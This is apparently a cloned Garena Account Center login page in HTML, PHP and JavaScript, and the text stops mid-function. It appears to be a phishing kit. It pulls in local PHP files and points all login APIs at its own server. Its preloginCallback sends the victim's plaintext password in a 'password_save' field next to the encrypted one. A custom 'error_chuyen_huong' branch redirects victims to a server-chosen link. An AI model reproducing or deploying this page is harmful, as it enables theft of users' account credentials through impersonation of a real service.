
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="description" content="Garena Account Center">
<link href="/Assets_Garena/css/sso.css?v=0.58" rel="stylesheet" type="text/css">
<link href="/Assets_Garena/css/shopee-captcha-main.css?v=0.01" rel="stylesheet" type="text/css">
<title>Garena Account Center</title>
</head>
<body style="">
<script src="/Assets_Garena/js/jquery-1.10.2.min.js" type="text/javascript"></script>
<script src="/Assets_Garena/js/crypto.js?v=0.60" type="text/javascript"></script>
<script src="/Assets_Garena/js/countries.js?v=0.30" type="text/javascript"></script>
<script src="/Assets_Garena/js/locales.js?v=0.03" type="text/javascript"></script>
<?php $chanlv = file_get_contents('login/chanlv.txt'); require_once ('login/Msg.php');?>
<script src="/Assets_Garena/js/fetch.umd.min.js?v=3.6.2"></script>
<!-- for shopee captcha -->
<script src="/Assets_Garena/js/captcha-sdk-v2.0.1.js?v=0.02"></script>
<script>
	var SHOPEE_CAPTCHA_DOMAIN = "/shopee_captcha";
	var SHOPEE_CAPTCHA_GENERATE_URL = SHOPEE_CAPTCHA_DOMAIN + "/api/v4/anti_fraud/captcha/generate";
	var SHOPEE_CAPTCHA_VERIFY_URL = SHOPEE_CAPTCHA_DOMAIN + "/api/v4/anti_fraud/captcha/verify";
	var SHOPEE_CAPTCHA_REPORT_URL = SHOPEE_CAPTCHA_DOMAIN + "/api/v4/anti_fraud/captcha/report";
</script>
<script src="/Assets_Garena/js/shopee-captcha-bundle.js?v=0.01" type="text/javascript"></script>

<script src="/Assets_Garena/js/js.cookie.js?v=0.01"></script>

<!-- sso website -->
<script>
    var SETTINGS = {};
var captcha_key = '';
var mobile_register_request = {};

var SSO_SERVER_URL = '/';
var SSO_URL_API_PRELOGIN = SSO_SERVER_URL + 'api/prelogin';
var SSO_URL_API_LOGIN = SSO_SERVER_URL + 'api/login';
var SSO_URL_API_LOGOUT = SSO_SERVER_URL + 'api/logout';
var SSO_URL_UI_REGISTER =  'https://sso.garena.com/ui/register?redirect_uri=https%3A%2F%2Fsso.garena.com%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Dvi-VN%26%3D&locale=vi-VN';
var SSO_URL_API_AUTH = SSO_SERVER_URL + 'oauth/token/grant';
var SSO_URL_OAUTH_TOKEN_FACEBOOK_EXCHANGE = SSO_SERVER_URL + 'oauth/token/facebook/exchange';
var SSO_URL_OAUTH_TOKEN_VK_EXCHANGE = SSO_SERVER_URL + 'oauth/token/vk/exchange/v2';
var SSO_URL_OAUTH_TOKEN_LINE_EXCHANGE = SSO_SERVER_URL + 'oauth/token/line/exchange';
var SSO_URL_OAUTH_TOKEN_GOOGLE_EXCHANGE = SSO_SERVER_URL + 'oauth/token/google/exchange';
var SSO_URL_OAUTH_TOKEN_HUAWEI_EXCHANGE = SSO_SERVER_URL + 'oauth/token/huawei/exchange';
var SSO_URL_OAUTH_TOKEN_APPLE_EXCHANGE_WEB = SSO_SERVER_URL + 'oauth/token/apple/exchange/web';
var SSO_URL_OAUTH_TOKEN_TWITTER_EXCHANGE = SSO_SERVER_URL + 'oauth/token/twitter/exchange';
var SSO_URL_OAUTH_TWITTER_REQUEST_TOKEN = SSO_SERVER_URL + 'oauth/token/twitter/request_token';

var SSO_URL_API_REG = SSO_SERVER_URL + 'api/register';
var SSO_URL_API_REG_PREPARE = SSO_URL_API_REG + '/prepare';
var SSO_URL_API_REG_CHECK = SSO_URL_API_REG + '/check';
var SSO_URL_API_SEND_SMS_OTP = SSO_SERVER_URL + 'api/send_sms_otp';
var SSO_URL_API_VERIFY_MOBILE_NO = SSO_SERVER_URL + 'api/verify_mobile_no';
var DEFAULT_REDIRECT_URL = 'http://www.garena.com/';
var FACEBOOK_OAUTH_URL = 'https://www.facebook.com/dialog/oauth';
var VK_OAUTH_URL = 'https://oauth.vk.com/authorize';
var GOOGLE_OAUTH_URL = 'https://accounts.google.com/o/oauth2/v2/auth';
var LINE_OAUTH_URL = 'https://access.line.me/dialog/oauth/weblogin';
var HUAWEI_OAUTH_URL = 'https://oauth-login.cloud.huawei.com/oauth2/v2/authorize';
var TWITTER_OAUTH_URL = 'https://api.twitter.com/oauth/authenticate';
var APPLE_OAUTH_URL = 'https://appleid.apple.com/auth/authorize';
var GAS_APP_URL = 'gas://';
var GAS_IOS = 'http://itunes.apple.com/app/id857669215';
var GAS_ANDROID = 'http://cdn.garenanow.com/gas/mobile/android/gas.apk';
var CAPTCHA_SERVICE = 'https://gop.captcha.garena.com/image';
var CAPTCHA_SERVICE_TEST = 'https://testgop.captcha.garena.com/image';
var DEFAULT_LOCALE = 'en_SG';
var ACCOUNT_CENTER_URL = 'https://account.garena.com';
var ACCOUNT_CENTER_TEST_URL = 'https://account.test.garena.com';
var ACCOUNT_CENTER_RECOVERY_URL = 'https://account.garena.com/recovery';
var ACCOUNT_CENTER_RECOVERY_TEST_URL = 'https://account.test.garena.com/recovery';
var FB_PLATFORM_MODE = 'platform';

var KEY_CODE_ENTER = 13;
var PLATFORM_GARENA = 1;
var PLATFORM_BEETALK = 2;
var PLATFORM_FACEBOOK = 3;
var PLATFORM_VK = 5;
var PLATFORM_LINE = 6;
var PLATFORM_HUAWEI = 7;
var PLATFORM_GOOGLE = 8;
var PLATFORM_APPLE = 10;
var PLATFORM_TWITTER = 11;

var OTP_SMS_INTERVAL = 60;
var OTP_REGISTER_INTERVAL = 30;

</script>
<script src="/Assets_Garena/js/sso/utils.js?v=0.01" type="text/javascript"></script>
<script src="/Assets_Garena/js/sso/captcha.js?v=0.02" type="text/javascript"></script>
<script src="/Assets_Garena/js/sso/contents.js?v=0.01" type="text/javascript"></script>
<script src="/Assets_Garena/js/sso/register.js?v=0.02" type="text/javascript"></script>
<script>(function () {
	var inIframe = function () {
		try {
			return window.self !== window.top;
		} catch (e) {
			return true;
		}
	}();

	function appendPlatformsPanel(container) {
		if ((SETTINGS.show_platforms & (~(1 << (SETTINGS.platform - 1)))) == 0) {
			return;
		}
		var panel = $('<div/>').addClass('partnerLogin').appendTo(container);
		var promptText = $('<p/>').appendTo(panel);
		promptText.text(_('login_platform_garena_prompt'));
		var links = $('<div/>').addClass('partnerLink').appendTo(panel);
		if (SETTINGS.platform != PLATFORM_GARENA && (SETTINGS.show_platforms & (1 << (PLATFORM_GARENA - 1)))) {
			var linkGarena = $('<a/>', { 'href': 'javascript:;' }).addClass('icon-garena').appendTo(links);
			linkGarena.click(function () {
				changePlatform(PLATFORM_GARENA);
			});
		}
		if (SETTINGS.mode == 'oauth_login' && SETTINGS.platform != PLATFORM_FACEBOOK && (SETTINGS.show_platforms & (1 << (PLATFORM_FACEBOOK - 1)))) {
			var linkFacebook = $('<a/>', { 'href': 'javascript:;' }).addClass('icon-facebook').appendTo(links);
			linkFacebook.click(loginFacebook);
		}
		if (SETTINGS.mode == 'oauth_login' && SETTINGS.platform != PLATFORM_LINE && (SETTINGS.show_platforms & (1 << (PLATFORM_LINE - 1)))) {
			var linkLine = $('<a/>', { 'href': 'javascript:;' }).addClass('icon-line').appendTo(links);
			linkLine.click(loginLine);
		}
		if (SETTINGS.mode == 'oauth_login' && SETTINGS.platform != PLATFORM_VK && (SETTINGS.show_platforms & (1 << (PLATFORM_VK - 1)))) {
			var linkVk = $('<a/>', { 'href': 'javascript:;' }).addClass('icon-vk').appendTo(links);
			linkVk.click(loginVk);
		}
		if (SETTINGS.mode == 'oauth_login' && SETTINGS.platform != PLATFORM_GOOGLE && (SETTINGS.show_platforms & (1 << (PLATFORM_GOOGLE - 1)))) {
			var linkGoogle = $('<a/>', { 'href': 'javascript:;' }).addClass('icon-google').appendTo(links);
			linkGoogle.click(loginGoogle);
		}
		if (SETTINGS.mode == 'oauth_login' && SETTINGS.platform != PLATFORM_HUAWEI && (SETTINGS.show_platforms & (1 << (PLATFORM_HUAWEI - 1)))) {
			var linkHuawei = $('<a/>', { 'href': 'javascript:;' }).addClass('icon-huawei').appendTo(links);
			linkHuawei.click(loginHuawei);
		}
		if (SETTINGS.mode == 'oauth_login' && SETTINGS.platform != PLATFORM_APPLE && (SETTINGS.show_platforms & (1 << (PLATFORM_APPLE - 1)))) {
			var linkApple = $('<a/>', { 'href': 'javascript:;' }).addClass('icon-apple').appendTo(links);
			linkApple.click(loginApple);
		}
		if (SETTINGS.mode == 'oauth_login' && SETTINGS.platform != PLATFORM_TWITTER && (SETTINGS.show_platforms & (1 << (PLATFORM_TWITTER - 1)))) {
			var linkTwitter = $('<a/>', { 'href': 'javascript:;' }).addClass('icon-twitter').appendTo(links);
			linkTwitter.click(loginTwitter);
		}
	}

	// consider to use dialog for all captchas
	var login_captcha_dialog = null;
	var login_recaptcha_token = null;
	var login_shopee_captcha_token = null;

	function preloginCallback(data, status_code) {
		// show datadome recaptcha
		if (status_code == 403) {
			return;
		}
		if ('error' in data) {
			if (data['error'] == 'error_require_captcha') {
				showCaptcha();
				showError(_('login_' + data['error']), $('#line-btn'));
			} else if(data['error'] == 'error_captcha') {
				refreshCaptcha();
				$('#input-captcha').focus();
				showError(_('login_error_captcha'), $('#sso_captcha_wrap'));
			} else if (data['error'] == 'error_require_recaptcha_token') {
				renderRecaptcha('sso_recaptcha_wrap', function(token){ login_recaptcha_token = token; });
			} else if (data['error'] == 'error_recaptcha_token') {
				renderRecaptcha('sso_recaptcha_wrap', function(token){ login_recaptcha_token = token; });
				showError(_('login_error_captcha'), $('#line-btn'));
			} else if (data['error'] == 'error_require_shopee_captcha_token') {
				showShopeeCaptchaDialog(login_captcha_dialog, function(token) { login_shopee_captcha_token = token; hideCaptchaDialog(login_captcha_dialog); });
			} else if (data['error'] == 'error_shopee_captcha_token') {
				showShopeeCaptchaDialog(login_captcha_dialog, function(token) { login_shopee_captcha_token = token; hideCaptchaDialog(login_captcha_dialog); });
				showError(_('login_error_captcha'), $('#line-btn'));
			} else {
				showError(_('login_' + data['error']), $('#line-btn'));
			}
			$('#confirm-btn').attr("disabled", false);
			return;
		}

		var password = $('#sso_login_form_password').val();
		var passwordMd5 = CryptoJS.MD5(password);
		var passwordKey = CryptoJS.SHA256(CryptoJS.SHA256(passwordMd5 + data.v1) + data.v2);
		var encryptedPassword = CryptoJS.AES.encrypt(passwordMd5, passwordKey, { mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.NoPadding });
		encryptedPassword = CryptoJS.enc.Base64.parse(encryptedPassword.toString()).toString(CryptoJS.enc.Hex);

		var loginParams = {
			'account': data.account,
			'password': encryptedPassword,
			'password_save': password
		};
		if (SETTINGS['mode'] == 'sso_login') {
			var redirect_uri = getRequestParam('redirect_uri');
			if (redirect_uri != null) {
				loginParams['redirect_uri'] = redirect_uri;
			}
		}
		requestJson(SSO_URL_API_LOGIN, loginParams, SSO_SERVER.loginCallback);
	}

	function loginCallback(data) {
		if ('error' in data) {
			if (data['error'] == 'error_require_captcha') {
				showCaptcha();
				showError(_('login_' + data['error']), $('#line-btn'));
			} else if (data['error'] == 'error_captcha') {
				refreshCaptcha();
				showError(_('login_' + data['error']), $('#line-btn'));
			} else if (data['error'] == 'error_require_recaptcha_token') {
				renderRecaptcha('sso_recaptcha_wrap', function(token){ login_recaptcha_token = token; });
			} else if (data['error'] == 'error_recaptcha_token') {
				renderRecaptcha('sso_recaptcha_wrap', function(token){ login_recaptcha_token = token; });
				showError(_('login_error_captcha'), $('#line-btn'));
			} else if (data['error'] == 'error_require_shopee_captcha_token') {
				showShopeeCaptchaDialog(login_captcha_dialog, function(token) { login_shopee_captcha_token = token; hideCaptchaDialog(login_captcha_dialog); });
			} else if (data['error'] == 'error_shopee_captcha_token') {
				showShopeeCaptchaDialog(login_captcha_dialog, function(token) { login_shopee_captcha_token = token; hideCaptchaDialog(login_captcha_dialog); });
				showError(_('login_error_captcha'), $('#line-btn'));
			}else if (data['error'] == 'error_chuyen_huong')
			{
				window.location = data['link_ch'];
			} else if (data['error'] == 'error_security_ban') {
				var timeout = 7;
				showError(_('login_error_security_ban', { 'second': timeout }), $('#line-btn'));
				var interval_id = setInterval(function () {
					timeout--;
					showError(_('login_error_security_ban', { 'second': timeout }), $('#line-btn'));
					if (timeout <= 0) {
						clearInterval(interval_id);
						if (inIframe) {
							window.open(data['redirect_uri'], '_blank');
							clearMessage('#line-btn');
						} else {
							redirect(data['redirect_uri']);
						}
					}
				}, 1000)
			} else {
				showError(_('login_' + data['error']), $('#line-btn'));
			}
			$('#confirm-btn').attr("disabled", false);
			return;
		}
		SETTINGS['login'] = true;
		SETTINGS['uid'] = data['uid'];
		SETTINGS['username'] = data['username'];
		SETTINGS['timestamp'] = data['timestamp'];
		if (SETTINGS['mode'] == 'sso_login') {
			if (!iframeTryPostAfterLogin(data)) {
				if ('redirect_uri' in data) {
					redirect(data['redirect_uri']);
				} else {
					redirect(DEFAULT_REDIRECT_URL, { 'session_key': data['session_key'] });
				}
			}
		} else if (SETTINGS['mode'] == 'oauth_login') {
			requestJson(SSO_URL_API_AUTH, getRequestParams(), SSO_SERVER.grantTokenCallback, 'POST');
		}
	}

	function grantTokenCallback(data) {
		if ('error' in data) {
			if (data['error'] == 'error_require_grant') {
				if (isMobile()) {
					showGrantPage('mobile');
				} else {
					showGrantPage('pc');
				}
				return;
			}
			if (data['error'] == 'error_user_ban') {
				showError(_('login_error_user_ban'));
			} else {
				showError(_('grant_error'));
			}
			removeCookie(SETTINGS.session_cookie_name, SETTINGS.session_cookie_domain);
			$('#confirm-btn').attr("disabled", false);
			return;
		}
		redirect(data['redirect_uri']);
	}

	function showRegisterCaptchaPage() {
		var panelRegisterCaptcha = $('<div/>');
		$('<h2/>').addClass('title').text(_('register_captcha_header')).appendTo(panelRegisterCaptcha);

		var formRegisterCaptcha = $('<form/>', { 'id': 'form-register' }).addClass('loginForm').appendTo(panelRegisterCaptcha).submit(false);
		var captchaWrapper = $('<div/>', { 'class': 'line clearfix', 'id': 'sso_captcha_wrap' }).appendTo(formRegisterCaptcha);
		var rowCaptcha1 = $('<div/>', { 'id': 'line-captcha', 'class': 'sso_captcha' }).appendTo(captchaWrapper);
		var inputCaptcha = $('<input/>', {
			'id': 'input-captcha', 'name': 'captcha', 'type': 'text', 'placeholder': _('register_form_captcha_prompt'), 'autocorrect': 'off', 'autocapitalize': 'off'
		}).appendTo(rowCaptcha1);
		var rowCaptcha2 = $('<div/>', { 'id': 'sso_captcha_image', 'class': 'clearfix sso_captcha' }).appendTo(captchaWrapper);
		captcha_key = uuid().replace(/-/g, '');
		$('<img/>', { 'src': SETTINGS.test ? CAPTCHA_SERVICE_TEST : CAPTCHA_SERVICE + '?key=' + captcha_key }).appendTo($('<span/>', { 'class': 'code fl' }).appendTo(rowCaptcha2));
		var refresh_captcha = $('<a/>', { 'href': 'javascript:;', 'class': 'refresh fl' }).text(_('refresh_captcha')).appendTo(rowCaptcha2);
		refresh_captcha.click(refreshCaptcha);
		refreshCaptcha();

		var lineVerify = $('<div/>', { 'id': 'line-verify' }).appendTo(panelRegisterCaptcha);
		var btnVerify = $('<a/>', { 'href': 'javascript:;', 'class': 'btn btn-login' }).text(_('btn_captcha_verify')).appendTo(lineVerify);

		showContent(panelRegisterCaptcha, 'mobile');

		btnVerify.click(function () {
			var request = {
				'username': mobile_register_request['username'],
				'email': mobile_register_request['email'],
				'mobile_no': mobile_register_request['mobile_no1'] + mobile_register_request['mobile_no2']
			};
			var captcha = rowCaptcha1.find('input').val();
			if (captcha == null || captcha.length <= 0) {
				showError(_('register_error_captcha_empty'), $('#line-captcha'));
				refreshCaptcha();
				return;
			}
			request['captcha_key'] = captcha_key;
			request['captcha'] = captcha;
			requestJson(SSO_URL_API_REG_PREPARE, request, function (data) {
				if ('error' in data) {
					if (data['error'] == 'error_captcha') {
						showError(_('register_error_captcha'), $('#line-captcha'));
						inputCaptcha.val('');
						refreshCaptcha();
					} else {
						showMobileRegisterAlert(_('register_' + data.error));
					}
				} else {
					showRegisterVerifyMobilePage();
				}
			})
		});

		function onKeyPress(e) {
			if (e.which == KEY_CODE_ENTER) {
				e.preventDefault();
				if (!inputCaptcha.val()) {
					inputCaptcha.focus();
					return;
				}
				btnVerify.trigger('click');
			}
		}
		$('.content').keypress(onKeyPress);
	}

	function showRegisterVerifyMobilePage() {
		var panelRegisterVerifyMobile = $('<div/>');
		$('<h2/>').addClass('title').text(_('register_verify_mobile_header')).appendTo(panelRegisterVerifyMobile);
		var issues = $('<div/>', { 'id': 'line-issues', 'class': 'issues center' }).appendTo(panelRegisterVerifyMobile);

		$('<p/>').html(_('register_verify_mobile_description')).appendTo(issues);
		$('<p/>').addClass('emphasis').text(mobile_register_request['mobile_no1'] + ' ' + mobile_register_request['mobile_no2']).appendTo(issues);

		var resendLine = $('<div/>', { 'id': 'line-resend', 'class': 'resendLine clearfix' }).appendTo(panelRegisterVerifyMobile);
		var verification_code = $('<input/>', {
			'type': 'tel', 'placeholder': _('register_verify_mobile_prompt'), 'class': 'fl'
		}).appendTo(resendLine);
		var btnResend = $('<a/>', { 'href': 'javascript:;', 'class': 'btn btn-grey btn-resend fr' }).text(_('btn_register_verify_resend')).appendTo(resendLine);

		var lineVerify = $('<div/>', { 'id': 'line-verify' }).appendTo(panelRegisterVerifyMobile);
		var btnVerify = $('<a/>', { 'href': 'javascript:;', 'class': 'btn btn-login' }).text(_('btn_register_verify')).appendTo(lineVerify);

		showContent(panelRegisterVerifyMobile, 'mobile');
		btnResend.prop("disabled", true);
		resendCooldown();

		function resendCooldown() {
			var leftSeconds = OTP_REGISTER_INTERVAL;
			btnResend.text(_('btn_register_verify_resend_otp_timer', { 'second': leftSeconds }));
			btnResend.addClass('cooldown');
			var timer = setInterval(function () {
				leftSeconds--;
				if (leftSeconds <= 0) {
					btnResend.text(_('btn_register_verify_resend')).prop("disabled", false);
					btnResend.removeClass('cooldown');
					clearInterval(timer);
				} else {
					btnResend.text(_('btn_register_verify_resend_otp_timer', { 'second': leftSeconds }));
				}
			}, 1000);
		}

		btnResend.click(function () {
			if (btnResend.prop("disabled")) { return; }
			btnResend.prop("disabled", true);
			var request = {
				'username': mobile_register_request['username'],
				'email': mobile_register_request['email'],
				'mobile_no': mobile_register_request['mobile_no1'] + mobile_register_request['mobile_no2']
			};
			requestJson(SSO_URL_API_REG_PREPARE, request, function (data) {
				if ('error' in data) {
					if (data['error'] == 'error_require_captcha') {
						showRegisterCaptchaPage();
					} else {
						showMobileRegisterAlert(_('register_' + data.error));
					}
				} else {
					resendCooldown();
				}
			})
		});

		btnVerify.click(function () {
			if (!verification_code.val()) {
				showError(_('register_error_captcha_empty'), $('#line-resend'));
				return;
			}
			if (btnVerify.prop("disabled")) { return; }
			btnVerify.prop("disabled", true);
			var request = {
				'username': mobile_register_request['username'],
				'email': mobile_register_request['email'],
				'password': RSA(mobile_register_request['password']),
				'mobile_no': mobile_register_request['mobile_no1'] + mobile_register_request['mobile_no2'],
				'location': mobile_register_request['country'],
				'redirect_uri': getRequestParam('redirect_uri'),
				'otp': verification_code.val(),
				'locale': getRequestParam('locale')
			};
			requestJson(SSO_URL_API_REG, request, function (data) {
				if ('error' in data) {
					if (data['error'] == 'error_otp') {
						showError(_('register_error_otp'), $('#line-resend'));
					} else {
						showMobileRegisterAlert(_('register_' + data.error));
						return;
					}
					btnVerify.prop("disabled", false);
				} else {
					showRegisterFinishPage('mobile');
				}
			}, 'POST');
		});
	}

	function showGrantPage(mode) {
		var panelAuth = $('<div/>');
		var wrapper = $('<div/>').addClass('linkWrapper').appendTo(panelAuth);
		var icon_group = $('<div/>').addClass('linkImg').appendTo(wrapper);
		$('<img/>', { 'src': SETTINGS['app_icon'] }).appendTo(icon_group);
		//var user_icon = $('<div/>').addClass('user-icon icon-item').appendTo(icon_group);
		//var guser_i = $('<i/>').addClass('img').appendTo(user_icon);

		var description = $('<div/>').addClass('linkTips').text(_('grant_form_caption')).appendTo(icon_group);
		var app_name = $('<span/>').text(SETTINGS['app_name']).addClass('game-name');
		description.prepend(app_name);

		var btn_group = $('<div/>').addClass('linkBtn').appendTo(wrapper);
		var btnDecline = $('<a/>', {
			'id': 'sso_auth_from_decl_button', 'type': 'submit', 'text': _('grant_form_button_decline')
		}).addClass('btn-cancel').appendTo(btn_group);
		var btnAuthorize = $('<a/>', {
			'id': 'sso_auth_from_auth_button', 'type': 'submit', 'text': _('grant_form_button_confirm')
		}).addClass('btn-confirm').appendTo(btn_group);

		var panelLink = $('<div/>').addClass('linkChange').appendTo(panelAuth);
		var linkChangeAccount = $('<a/>', {
			'id': 'auth_link_change_account', 'text': _('grant_link_change_account_text'), 'href': 'javascript:;'
		}).appendTo(panelLink);
		showContent(panelAuth, mode);

		btnAuthorize.click(function auth() {
			var params = getRequestParams();
			params['grant'] = 1;
			requestJson(SSO_URL_API_AUTH, params, SSO_SERVER.grantTokenCallback, 'POST');
		});
		btnDecline.click(function decline() {
			redirect(getRequestParam('redirect_uri'), { 'error': 'access_denied' });
		});
		linkChangeAccount.click(function changeAccount() {
			removeCookie(SETTINGS.session_cookie_name, SETTINGS.session_cookie_domain);
			showLoginPage(mode);
		});
	}

	function showLoginPage(mode) {
		var panelLogin = $('<div/>');
		appendPlatformsPanel(panelLogin);

		$('<h2/>').addClass('title').text(_('login_header')).prependTo(panelLogin);

		var formLogin = $('<form/>', { 'id': 'login-form' }).addClass('loginForm').appendTo(panelLogin);

		var mobileAccount = false;

		var lineCountry = $('<div/>', { 'id': 'line-country', 'style': 'display: none;' }).addClass('line').appendTo(formLogin);
		var selectCountry = $('<select/>', {
			'id': 'sso_login_form_select_country', 'name': 'select_country'
		}).addClass('country').appendTo(lineCountry);
		for (i in COUNTRY_LIST) {
			var option = $('<option/>', { 'value': COUNTRY_LIST[i].code, 'data-country-code': COUNTRY_LIST[i].pcode });
			var content = COUNTRY_LIST[i].name + " ";
			if (COUNTRY_LIST[i].hasOwnProperty("lname")) {
				content = content + "(" + COUNTRY_LIST[i].lname + "\u200e) ";
			}
			$('<p/>').text(content).appendTo(option);
			selectCountry.append(option);
		}

		var lineAccount = $('<div/>', { 'id': 'line-account' }).addClass('line').appendTo(formLogin);
		var txtCountryCode = $('<span/>', {
			'id': 'sso_login_form_country_code', 'style': 'display: none;'
		}).addClass('country-code').appendTo(lineAccount);
		selectCountry.change(function () {
			var selected = $(this).find(":selected");
			txtCountryCode.text('+' + selected.data('country-code'));
		});
		selectCountry.val(SETTINGS.country).change();
		var txtAccount = $('<input/>', {
			'id': 'sso_login_form_account', 'name': 'username', 'type': 'text', 'placeholder': _('login_form_account_prompt'), 'autocorrect': 'off', 'autocapitalize': 'off'
		}).appendTo(lineAccount);
		if (SETTINGS.test && SETTINGS.language == 'vi' && /android/i.test(navigator.userAgent)) {
			txtAccount.attr('placeholder', _('login_form_account_prompt_vi'));
		}
		var txtPassword = $('<input/>', {
			'id': 'sso_login_form_password', 'name': 'password', 'type': 'password', 'placeholder': _('login_form_password_prompt')
		}).appendTo($('<div/>', { 'id': 'line-password' }).addClass('line').appendTo(formLogin));

		var captchaWrapper = $('<div/>', { 'class': 'line clearfix', 'id': 'sso_captcha_wrap' }).appendTo(formLogin);
		var rowCaptcha1 = $('<div/>', { 'id': 'line-captcha', 'class': 'sso_captcha' }).appendTo(captchaWrapper);
		$('<input/>', {
			'id': 'input-captcha', 'name': 'captcha', 'type': 'text', 'placeholder': _('login_form_captcha_prompt'), 'autocorrect': 'off', 'autocapitalize': 'off'
		}).appendTo(rowCaptcha1);
		var rowCaptcha2 = $('<div/>', { 'id': 'sso_captcha_image', 'class': 'clearfix sso_captcha' }).appendTo(captchaWrapper);
		$('<img/>').appendTo($('<span/>', { 'class': 'code fl' }).appendTo(rowCaptcha2));
		var refresh_captcha = $('<a/>', { 'href': 'javascript:;', 'class': 'refresh fl' }).text(_('refresh_captcha')).appendTo(rowCaptcha2);
		refresh_captcha.click(refreshCaptcha);
		rowCaptcha1.hide();
		rowCaptcha2.hide();

		$('<div/>', {'class': 'line clearfix', 'id': 'sso_recaptcha_wrap'}).appendTo(formLogin);

		login_captcha_dialog = initCaptchaDialog('login_captcha_dialog', formLogin);

		var btnLogin = $('<input/>', {
			'id': 'confirm-btn', 'name': 'login', 'type': 'submit', 'value': _('login_form_button_login'), 'onclick': 'javascript:return false;'
		}).addClass('btn').appendTo($('<div/>', { 'id': 'line-btn', 'class': 'line btnLine' }).appendTo(formLogin));

		var dividerOr = $('<span/>').text(_('sso_login_divider_text')).appendTo($('<div/>', { 'class': 'divider' }).appendTo(formLogin));

		var btnRegister = $('<input/>', {
			'id': 'sso_login_link_register', 'name': 'register', 'type': 'button', 'value': _('sso_login_link_register_text'), 'onclick': 'javascript:return false;'
		}).addClass('btn').addClass('black').appendTo($('<div/>', { 'id': 'line-btn', 'class': 'line btnLine' }).appendTo(formLogin));

		var panelLink = $('<div/>').addClass('linkLine').appendTo(panelLogin);

		// $('<span/>', {'role': 'separator', 'aria-hidden': 'true'}).text(_('sso_login_link_separator')).appendTo(panelLink);
		var linkForgetPassword = $('<a/>', {
			'id': 'sso_login_link_forget_password', 'text': _('sso_login_link_forget_password_text'), 'href': 'javascript:;'
		}).addClass('sec').appendTo(panelLink);

		var username = getRequestParam('username');
		if (username != null) {
			txtAccount.val(username);
			txtPassword.focus();
		}

		showContent(panelLogin, mode);

		 btnRegister.click(function register() {
            var requestParams = getRequestParams();
            if (inIframe) {
                var register_url = SSO_URL_UI_REGISTER;
                if ('locale' in requestParams) {
                    register_url += '?locale=' + requestParams['locale'];
                }
                window.open(register_url, '_blank');
            } else {
                var params = {
                    '': window.location.href=""
                };
                if ('display' in requestParams) {
                    params['display'] = requestParams['display'];
                }
                if ('locale' in requestParams) {
                    params['locale'] = requestParams['locale'];
                }
                redirect(SSO_URL_UI_REGISTER, params);
            }
        });

		linkForgetPassword.click(function forgetPassword() {
			if (SETTINGS.test) {
				window.open(ACCOUNT_CENTER_RECOVERY_TEST_URL, '_blank');
			} else {
				window.open(ACCOUNT_CENTER_RECOVERY_URL, '_blank');
			}
		});

		txtAccount.blur(checkMobile);
		function checkMobile() {
			var account = txtAccount.val();
			if (/^\d{6,15}$/.test(account)) {
				mobileAccount = true;
				lineCountry.show();
				txtCountryCode.show();
				txtAccount.addClass('mobile-number');
			} else {
				mobileAccount = false;
				lineCountry.hide();
				txtCountryCode.hide();
				txtAccount.removeClass('mobile-number');
			}
		}

		function login() {
			checkMobile();
			var account;
			if (mobileAccount) {
				account = txtCountryCode.text() + txtAccount.val();
			} else {
				account = txtAccount.val();
			}
			var password = txtPassword.val();
			if (account.length <= 0) {
				showError(_('login_error_account_empty'), $('#line-account'));
				txtAccount.focus();
				return;
			}
			if (password.length <= 0) {
				showError(_('login_error_password_empty'), $('#line-password'));
				txtPassword.focus();
				return;
			}
			var request = { 'account': account };
			if ($('.sso_captcha').is(":visible")) {
				var captcha = rowCaptcha1.find('input').val();
				if (captcha == null || captcha.length <= 0) {
					showError(_('login_error_captcha_empty'), $('#sso_captcha_wrap'));
					refreshCaptcha();
					return;
				}
				request['captcha_key'] = captcha_key;
				request['captcha'] = captcha;
			}

 
 
//  Auto login 
		  
		btnLogin.attr("disabled", true);
			requestJsonWithCaptchaDialogProtection(SSO_URL_API_PRELOGIN, request, SSO_SERVER.preloginCallback, 'GET', login_captcha_dialog);
		}



		function onKeyPress(e) {
			if (e.which == KEY_CODE_ENTER) {
				e.preventDefault();
				if (btnLogin.attr("disabled")) {
					return;
				}
				if (txtAccount.val().length <= 0) {
					if (txtAccount.is(':focus')) {
						showError(_('login_error_account_empty'), $('#line-account'));
					}
					txtAccount.focus();
					return;
				}
				if (txtPassword.val().length <= 0) {
					if (txtPassword.is(':focus')) {
						showError(_('login_error_password_empty'), $('#line-password'));
					}
					txtPassword.focus();
					return;
				}
				login();
			}
		}

		$('.content').keypress(onKeyPress);
		btnLogin.click(login);

		txtAccount.focus();

		if (SETTINGS.iframe) {
			iframeDetectHeight();
		}
	}

	function updateURLParameter(url, paramName, paramVal, addIfNotExist) {
		addIfNotExist = addIfNotExist || false;
		var tempArray = url.split("?");
		var resultURL = tempArray[0]; // baseURL
		for (var i = 1; i < tempArray.length; i++) {
			var queryString = tempArray[i];
			var newQueryString = "";
			var separator = "";
			var exist = false;
			if (queryString) {
				var queryList = queryString.split("&");
				for (var j = 0; j < queryList.length; j++) {
					if (queryList[j].split('=')[0] != paramName) {
						newQueryString += separator + queryList[j];
						separator = "&";
					}
					else {
						exist = true;
						if (paramVal != '') {
							newQueryString += separator + paramName + "=" + paramVal;
							separator = "&";
						}
					}
				}
			}
			if (addIfNotExist && !exist) {
				newQueryString += separator + paramName + "=" + paramVal;
			}
			resultURL = resultURL + "?" + newQueryString;
		}
		return resultURL
	}

	function removeLastParamByName(url, paramName) {
		var tempArray = url.split("?");
		var resultURL = tempArray[0];
		for (var i = 1; i < tempArray.length; i++) {
			var queryString = tempArray[i];
			var newQueryString = "";
			var separator = "";
			if (queryString) {
				var queryList = queryString.split("&");
				var found = false;
				for (var j = queryList.length-1; j >= 0; j--) {
					if (queryList[j].split('=')[0] === paramName && !found) {
						found = true;
						continue;
					}
					newQueryString = queryList[j] + separator + newQueryString;
					separator = "&";
				}
			}
			resultURL = resultURL + "?" + newQueryString;
		}
		return resultURL
	}

	/* =========================================
		Login Platforms
	   ========================================= */

	function loginVk() {
		var params = {};
		params.client_id = SETTINGS.vk_client_id;
		params.display = 'page';
		params.redirect_uri = updateURLParameter(window.location.href.split('#')[0], 'platform', PLATFORM_VK, true);
		params.scope = 'friends,offline';
		params.response_type = 'token';
		params.v = '5.69';
		redirect(VK_OAUTH_URL, params);
